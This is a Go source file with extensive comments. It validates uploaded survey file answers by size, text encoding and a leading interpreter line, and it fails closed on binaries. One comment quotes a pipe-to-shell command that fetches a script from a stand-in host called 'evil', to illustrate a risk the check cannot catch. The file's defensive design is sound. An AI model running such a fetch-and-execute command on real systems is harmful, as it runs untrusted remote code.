// This file is the rule a `file` survey answer is judged by: how big it may
// be, what it may contain, and which of the two independent gates has to be
// open before it may contain a program.
//
// The rule is an ALLOWLIST of bytes this platform can prove are inert, not
// a denylist of shapes somebody enumerated as dangerous. That choice is the
// whole design. A denylist of magic numbers -- ELF, MZ, PK, a shebang -- is
// what the polyglot, the byte-order mark, the UTF-16 encoding and the zip
// container all exist to walk past, and it fails OPEN on every shape nobody
// thought of. An allowlist fails closed on all of them without naming any
// of them: a format invented tomorrow that carries a NUL byte is refused by
// a rule written today.
//
// KNOWN, DELIBERATE RESIDUAL RISK, and it is larger than the feature's name
// suggests. This refuses a file that ANNOUNCES itself as a program. It does
// not, and cannot, refuse a file that IS one. A text file holding
// `curl evil.sh | sh` and no interpreter line is inert by every test here
// and is accepted with both gates shut, because the dangerous property does
// not live in the bytes: it lives in what the automation does with them. A
// runbook is free today to pipe any `text` answer to a shell, with no flag,
// no environment variable and no disclosure, and nothing in this file
// changes that. The Controller cannot even tell which tasks execute their
// inputs -- internal/engine/action_capability.go is a two-entry table.
//
// So what the two gates actually buy is separation of duty rather than
// content inspection: neither is settable by the person launching the job,
// they belong to two principals with two different change-control paths,
// and an answer that trips the rule leaves a legible refusal naming both.
// That is worth having. It is not a sandbox, and this file says so out loud
// rather than letting the flag's existence imply one. The untaken fix is a
// gate on what a runbook may DO with an answer, which is a different and
// much larger piece of work than a gate on what an answer looks like.
package launch

import (
	"bytes"
	"errors"
	"fmt"
	"unicode/utf8"
)

// MaxFileAnswerBytes bounds one file answer.
//
// 32 KiB, and the number is chosen against a constraint rather than picked
// for roundness: internal/api's decodeJSON caps every request body at 64
// KiB, so an answer above this could be accepted by the server-rendered
// form and refused by the JSON API with a 413 that names no question. Half
// the body budget leaves room for the launch's own overrides and for a
// second answer beside it.
//
// For scale, it is several times the largest thing this type is for: a
// 4096-bit private key in PEM armour is about 3 KiB, a full certificate
// chain about 8 KiB, and 32 KiB of newline-separated hostnames is roughly
// nineteen hundred of them.
const MaxFileAnswerBytes = 32 << 10

// ErrProgramContent is returned when a file answer declares itself a
// program and the two gates are not both open.
//
// Its own sentinel rather than another ErrSurveyAnswer, because the two
// need different answers. A malformed answer is fixed by supplying a
// different file; this one is fixed by a template author and a deployment
// operator agreeing, which is not something the person at the launch form
// can do, and telling them to correct their input would be telling them to
// do the one thing that cannot work.
var ErrProgramContent = errors.New("launch: this file declares itself a program")

// ProgramContentMessage is the sentence both refusals use, verbatim.
//
// One constant in the shape routing.UnsupportedInjectionMessage sets, so an
// operator who meets this at launch after meeting it while authoring does
// not have to work out whether it is the same rule. It says what the rule
// is AND what it is not, because a refusal that only says "refused" invites
// the reading that whatever gets through is safe.
const ProgramContentMessage = "this platform refuses a survey file that opens with an interpreter line unless the " +
	"deployment sets PLEIADES_SURVEY_FILE_ALLOW_PROGRAM_CONTENT and the question itself is marked as accepting " +
	"program content. Note that a file without an interpreter line is not thereby safe: what an answer can do is " +
	"decided by what the automation does with it, not by how the file begins"

// FileContentClass is what a file answer's bytes turned out to be.
type FileContentClass int

// The classes, in the order a reader should think about them.
//
// FileBinary is the zero value deliberately. A classification that failed
// to run, a struct that was never filled in and a switch arm nobody wrote
// all land on the refusing answer rather than the permissive one.
const (
	// FileBinary is anything this platform cannot prove is text. It is
	// refused unconditionally: no gate admits it.
	FileBinary FileContentClass = iota

	// FileProgramText is inert text that opens with an interpreter line.
	// It is the only class the two gates govern.
	FileProgramText

	// FileInertText is text with no interpreter line. Always accepted, and
	// "inert" claims only that it is not a program by the two tests that
	// can be proved -- not that it is harmless.
	FileInertText
)

// String names a class for a message.
func (c FileContentClass) String() string {
	switch c {
	case FileProgramText:
		return "program text"
	case FileInertText:
		return "text"
	default:
		return "binary"
	}
}

// byteOrderMarks are the encodings this refuses outright rather than
// decoding.
//
// Refused rather than stripped-and-rechecked, which is the important half.
// Stripping a mark and re-running the tests is two passes over two
// different byte strings, and every historical bypass of a check like this
// one lives in the gap between those passes. Refusing at the mark means
// there is no second pass to desynchronise.
//
// UTF-16 is caught twice over, here and by the NUL rule below, since
// UTF-16LE ASCII is every other byte zero. The redundancy is deliberate: a
// mark-less UTF-16 file still fails.
var byteOrderMarks = [][]byte{
	{0xEF, 0xBB, 0xBF},       // UTF-8
	{0xFF, 0xFE, 0x00, 0x00}, // UTF-32LE, before UTF-16LE, which is its prefix
	{0x00, 0x00, 0xFE, 0xFF}, // UTF-32BE
	{0xFF, 0xFE},             // UTF-16LE
	{0xFE, 0xFF},             // UTF-16BE
}

// ClassifyFileContent decides what a file answer is.
//
// Every test is a property of the whole byte string rather than of a
// sampled prefix, which the size bound is what makes affordable. A
// classifier that reads the first 512 bytes has a hole exactly where
// somebody puts the interesting bytes.
func ClassifyFileContent(content []byte) FileContentClass {
	if !utf8.Valid(content) {
		return FileBinary
	}
	// NUL is valid UTF-8, so the encoding test above does not catch it, and
	// it is what every compiled object, archive and image carries within
	// its first bytes. The two tests are not redundant.
	if bytes.IndexByte(content, 0x00) >= 0 {
		return FileBinary
	}
	for _, mark := range byteOrderMarks {
		if bytes.HasPrefix(content, mark) {
			return FileBinary
		}
	}

	// Offset zero exactly, with no line splitting and no whitespace
	// tolerance, because that is the only place a kernel honours it. A
	// leading blank line means the file is not executed as a program by
	// the mechanism this test is about.
	if bytes.HasPrefix(content, []byte("#!")) {
		return FileProgramText
	}
	return FileInertText
}

// FilePolicy is the deployment's half of the program-content decision.
//
// A value threaded from the composition root, never a package variable and
// never re-read from the environment downstream, so what a launch is judged
// by is what the Controller was started with rather than what some later
// caller happened to look up. The zero value refuses, which is what makes a
// forgotten threading fail closed: a Config nobody stamped is a Config that
// admits no program content.
type FilePolicy struct {
	// AllowProgramContent is the deployment's consent, and consent is all
	// it is. On its own it permits nothing: a question must also be marked
	// before an answer opening with an interpreter line is accepted.
	AllowProgramContent bool
}

// checkFileAnswer judges one file answer.
//
// The order matters and is not arbitrary. Size first, because it is the
// cheapest test and the one whose message is most actionable. Then the
// class, which is a property of the bytes. Then the gates, which are a
// property of the deployment and the template and are consulted only for
// the one class they govern -- so an armed question still cannot carry a
// binary, and turning the environment variable on does not widen what may
// be uploaded, only who decided.
func checkFileAnswer(q Question, content string, pol FilePolicy) error {
	if len(content) > MaxFileAnswerBytes {
		return fmt.Errorf("%w: %q is %d bytes, and a file answer may be at most %d",
			ErrSurveyAnswer, q.Variable, len(content), MaxFileAnswerBytes)
	}

	switch ClassifyFileContent([]byte(content)) {
	case FileInertText:
		return nil

	case FileProgramText:
		// Both, re-read live. The deployment's gate is checked at every
		// launch rather than only when the question was authored, which is
		// what makes turning it off a real kill switch: existing templates
		// carrying the flag stop launching, rather than only new ones
		// stopping being authorable. A gate that guards authoring alone
		// guards nothing that is already in production.
		if pol.AllowProgramContent && q.AllowProgramContent {
			return nil
		}
		return fmt.Errorf("%w: %q was given a file that opens with an interpreter line. %s",
			ErrProgramContent, q.Variable, ProgramContentMessage)

	default:
		// No gate admits this, and that is the one genuinely provable
		// property in the file. A binary answer is also useless here: the
		// answer becomes an extra variable a runbook reads as a string,
		// and this platform's expression engine has no filter that decodes
		// bytes, so accepting one would store and transmit something
		// nothing downstream could read.
		return fmt.Errorf("%w: %q must be a text file. What was supplied is not valid UTF-8 text, "+
			"or carries a NUL byte or a byte-order mark, which is how a compiled program, an archive "+
			"or a UTF-16 export presents",
			ErrSurveyAnswer, q.Variable)
	}
}
